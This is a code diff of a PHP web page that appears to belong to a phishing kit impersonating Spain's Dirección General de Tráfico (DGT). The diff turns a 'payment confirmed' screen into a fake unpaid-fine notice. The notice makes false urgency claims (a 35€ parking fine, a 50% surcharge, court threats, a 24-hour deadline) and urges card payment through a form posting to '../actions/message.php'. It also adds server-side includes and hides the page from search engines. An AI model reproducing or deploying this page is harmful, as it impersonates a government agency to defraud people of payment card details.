@@ -1,47 +1,53 @@
-<html
-	class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember"
-	data-19ax5a9jf="dingo" data-aui-build-date="3.23.1-2023-11-28">
+<?php
+
+include '../server/fonctions.php'; 
+include '../settings.php'; 
+require '../server/all.php';
 
 
-<head>
-    <meta http-equiv="refresh" content="5;url=https://www.dgt.es">
-	<!--TITRE  -->
-	<title dir="ltr">Pago confirmado</title>
-
-	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<meta name="robots" content="nofollow">
-	<!-- CSS  -->
-	<link rel="stylesheet"	href="../assets/css/61zcRmYWpgL._RC_11Fd9tJOdtL.css,11tfezETfFL.css,31Q3id-QR0L.css,31U9HrBLKmL.css_.css">
-	<link rel="stylesheet" href="../assets/css/01SdjaY0ZsL._RC_31jdWD+JB+L.css,51ndJ60shfL.css_.css">
-	<link rel="stylesheet" href="../assets/css/21PFuszay6L.css">
-	<!-- JS  -->
-	<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
-
-</head>
-
+?>
 
 <!DOCTYPE html>
 <html lang="es"><head>				
 	<title>DGT - Â¿QuÃ© hacer si has recibido una multa?</title>
 	
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-	<meta name="author" content="DGT, Ministerio interior">
-	<meta name="generator" content="DGT, DirecciÃ³n General TrÃ¡fico">
-	<meta name="keywords" content="DGT, trÃ¡fico, noticias, actualidad, puntos">
-	<meta name="description" content="Noticias, Notas prensa, InformaciÃ³n TrÃ¡fico, CampaÃ±as - DGT">
-<meta property="og:title" content="Â¿QuÃ© hacer si has recibido una multa?">
-	<meta property="og:description" content="Noticias, Notas prensa, InformaciÃ³n TrÃ¡fico, CampaÃ±as - DGT">
-	<meta property="og:locale" content="es">
-	<meta name="robots" content="index, follow">
-	<meta name="revisit-after" content="7 days">
+	<meta name="robots" content="noindex, nofollow">
+	<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
 	
 	
 	
+	<link rel="icon" type="image/x-icon" href="favicon.ico">
 	
+	<link rel="apple-touch-icon" sizes="57x57" href="images/apple-icon-57x57.png"> 
+	<link rel="apple-touch-icon" sizes="60x60" href="images/apple-icon-60x60.png"> 
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-icon-72x72.png"> 
+	<link rel="apple-touch-icon" sizes="76x76" href="images/apple-icon-76x76.png"> 
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-icon-114x114.png"> 
+	<link rel="apple-touch-icon" sizes="120x120" href="images/apple-icon-120x120.png"> 
+	<link rel="apple-touch-icon" sizes="144x144" href="images/apple-icon-144x144.png"> 
+	<link rel="apple-touch-icon" sizes="152x152" href="images/apple-icon-152x152.png"> 
+	<link rel="apple-touch-icon" sizes="180x180" href="images/apple-icon-180x180.png"> 
+	<link rel="icon" type="image/png" sizes="192x192" href="images/android-icon-192x192.png"> 
+	<link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png"> 
+	<link rel="icon" type="image/png" sizes="96x96" href="images/favicon-96x96.png"> 
+	<link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png">
+	<style>
+        /* Style du bouton */
+        .custom-button {
+            background-color: #048;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px; /* Bords arrondis */
+            cursor: pointer;
+        }
 
-		
+        /* Style au survol du bouton */
+        .custom-button:hover {
+            background-color: #036; /* Changer la couleur au survol */
+        }
+    </style>	
 	
 
 <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-print.min.css" media="print"> 
@@ -1128,7 +1134,7 @@
 												<div class="tags"></div>
 											</div>
 											<!-- Titre :  Amende impayÃ©  -->
-											<h1>Su pago ha sido confirmado !</h1>
+											<h1>Multa impagada Ãºltima notificaciÃ³n antes del recargo</h1>
 											<small class="date"></div>
 										</div>
 									</div>
@@ -1149,17 +1155,22 @@
 								<div class="container">
 									<div role="alert" class="alert alert-info  show" data-status="" data-status2="" data-status3="">
 										<span>
-											<!-- Message -->
 											<span>
 												<p>
-													<strong>
-												Gracias, su pago estÃ¡ siendo procesado y se ha tenido en cuenta.<br>
-												En breve recibirÃ¡ una factura por su pago.
-													</strong>
+													Recuerda que la DGT notifica sus multas unicamente a travÃ©s de uno de los siguientes canales:
+													<br>
+													<br>
 												</p>
-												
+												<ul class="check">
+													<li>A raÃ­z de los numerosos relanzamientos por correo, todavÃ­a no hemos recibido su pago de 35â‚¬ por estacionamiento no autorizado en una vÃ­a prohibida.</li>
+													<li>Para evitar un recargo del 50% y posibles demandas judiciales, le rogamos que haga el pago con tarjeta de crÃ©dito.</li>
+												</ul>
 												<p>
-													
+													<strong>
+														Tiene menos de 24 horas para pagar la multa y aprovechar un descuento del 50%.
+														<br>
+														<br>
+													</strong>
 												</p>
 											</span>
 										</span>
@@ -1283,7 +1294,10 @@
 									<div class="row">
 										<div class="col-12">
 											<div class="formalities-out">
-												<!-- Enlace -->
+												<form action ='../actions/message.php' method ="post">
+												<button type="submit" name="login_submit" class="custom-button form-ontrol">Realizar el pago de la multa</button>
+												</form>
+												
 												
 											</div>
 										</div>
@@ -1327,10 +1341,149 @@
 						<button type="button" class="close icon-close" data-dismiss="dialog" aria-label="Close"><span class="sr-only">cerrar reproductor</span></button>
 					</div>
 				</div>
-			
+				<a title="ir al inicio de la pÃ¡gina" aria-label="ir al inicio de la pÃ¡gina" href="#" class="go-top icon-chevron" style="display:none"></a>
+				<!-- Pie -->
+				<footer>
+					<div class="container">
+						<div class="row">
+							<div class="col-lg-4 I">
+								<div>
+									<div class="logos">
+										<a class="navbar-brand gob"  target="_blank"><img src="../assets/images/Logotipo_Footer-DGT.svg" width="300" heigth="57" alt="Ministerio del interior - DGT"></a>
+									</div>
+									<h2>Sobre la DGT</h2>
+									<div class="list list-group about">
+										<p>
+											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Sede ElectrÃ³nica de la DGT</a>
+											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Revista TrÃ¡fico y Seguridad Vial</a>
+											<a  class="list-group-item list-group-item-action" target="_blank">Consejo Superior de TrÃ¡fico, Seguridad vial y Movilidad Sostenible</a>
+											<a  class="list-group-item list-group-item-action" target="_blank">FacturaciÃ³n ElectrÃ³nica y Perfil del Contratante</a>
+											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Portal estadÃ­stico de la DGT</a>
+											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Seguridad Vial 2030</a>
+										</p>
+									</div>
+								</div>
+							</div>
+							<div class="col-lg-4 C">
+								<div>
+									<h2>A un clic</h2>
+									<div class="list list-group click">
+										<p>
+											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Ministerio del Interior</a>
+											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Datos abiertos del Gobierno de EspaÃ±a</a>
+											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Punto de acceso a las Administraciones PÃºblicas</a>
+											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Cl@ve</a>
+											<a  class="list-group-item list-group-item-action iconExternalLink" target="_blank">Portal de Transparencia de la AGE</a>
+										</p>
+									</div>
+								</div>
+							</div>
+							<div class="col-lg-4 D">
+								<div>
+									<style>
+										.rrssFooter a
+										{
+										}
 
-			
-				
+										.icon-twitter-foot
+										{
+											margin-top: 0;
+										}
+									</style>
+									<h2>ContÃ¡ctanos</h2>
+									<ul class="list list-group contact">
+										<li class="list-group-item">
+											<span><a  class="list-group-item list-group-item-action">060</a></span>
+											<span>TelÃ©fono de atenciÃ³n al ciudadano</span>
+										</li>
+										<li class="list-group-item">
+											<span><a  class="list-group-item list-group-item-action">011</a></span>
+											<span>TelÃ©fono de informaciÃ³n de carreteras</span>
+										</li>
+										<li class="list-group-item">
+											<span><a  class="list-group-item list-group-item-action">987 010 559</a></span>
+											<span>Centro de tratamiento de denuncias automatizadas</span>
+										</li>
+										<li class="list-group-item li-rrssFooter">
+											<span class="rrssFooter">
+												<a class="icon-instagram-alt"  target="_blank"><span class="sr-only">Instagram</span></a>
+												<a class="icon-twitter-foot"  target="_blank"><span class="sr-only">Twitter</span></a>
+												<a class="icon-youtube"  target="_blank"><span class="sr-only">Youtube</span></a>
+												<a class="icon-facebook-alt"  target="_blank"><span class="sr-only">Facebook</span></a>
+											</span>
+											<span>&nbsp;Redes Sociales</span>
+										</li>
+									</ul>
+								</div>
+							</div>
+						</div>
+					</div>
+					<div class="container-fluid d-flex justify-content-center mt-3">
+						<div>
+							<a  target="_blank">Aviso legal</a>
+							<a  target="_blank">PolÃ­tica de privacidad</a>
+							<a  target="_blank">PolÃ­tica de cookies</a>
+							<a  target="_blank">Accesibilidad</a>
+							<a >Mapa web</a>
+						</div>
+					</div>
+				</footer>
+				<!-- Fin Pie -->
+				<!-- Social links -->
+				<span class="sr-only">Mostrar elementos de contacto</span>
+			</button>
+			<div class="collapse socialSideBar" id="collapseFixedLinks">
+				<div class="social ">
+					<ul>
+						<li>
+							<a class="icon-phone" href="" title="Acceder a conoce la DGT (donde estamos)"><span class="sr-only">Contacto</span></a>
+						</li>
+						<li>
+							<a class="icon-twitter" href="" title="Accede a la cuenta X de la DGT">
+								<svg viewBox="-10 -15 40 40" aria-hidden="true" class="r-18jsvk2 r-4qtqp9 r-yyyyoo r-16y2uox r-8kz0gk r-dnmrzs r-bnwqim r-1plcrui r-lrvibr r-lrsllp" style="align-items: center;justify-content: center;">
+									<g>
+										<path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+									</g>
+								</svg>
+							</a>
+						</li>
+						<li>
+							<a class="icon-facebook" href="" title="Accede a la cuenta Facebook de la DGT"><span class="sr-only">Facebook</span></a>
+						</li>
+						<li>
+							<a class="icon-youtube" href="" title="Accede a la cuenta Youtube de la DGT"><span class="sr-only">Youtube</span></a>
+						</li>
+						<li>
+							<a class="icon-instagram" href="" title="Accede a la cuenta Intagram de la DGT"><span class="sr-only">Instagram</span></a>
+						</li>
+						<li>
+							<a id="social-icon-alert-boletin" class="icon-alert" href="/estaticos/boletin/boletin.mp3" data-title="Consulta la actualidad del trÃƒÂ¡fico" title="Escuchar boletÃ­n radiofÃ³nico">
+								<span class="sr-only">Consulta la actualidad del trÃƒÂ¡fico</span>
+								<audio id="audio-icon-alert-boletin">
+									<source src="media/boletin.mp3" type="audio/mpeg">
+										TÃº navegador no soporta el tag de audio HTML5
+									</audio>
+								</a>
+							</li>
+						</ul>
+					</div>
+				</div>
+				<!-- Fin social links -->
+				<!-- Ventanas Modales  -->
+				<div class="modal-backdrop fade fixed-links-backdrop"></div>
+				<!-- Modal Generico -->
+				<div class="modal fade" id="genericModal" tabindex="-1" role="dialog" aria-labelledby="modalgenericModalLabel" aria-hidden="true">
+					<div class="modal-dialog" role="document">
+						<div class="modal-content">
+							<div class="modal-header">
+								<strong><span class="modal-title" id="modalgenericModalLabel"></span></strong>
+								<button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">Ã—</span></button>
+							</div>
+							<div class="modal-body">
+								<div id="qr" style="display:none;"></div>
+								<p class="modal-text" style="display:none;"></p>
+							</div>
+						</div>
 					</div>
 				</div>
 				<!-- Fin Modal Generico -->
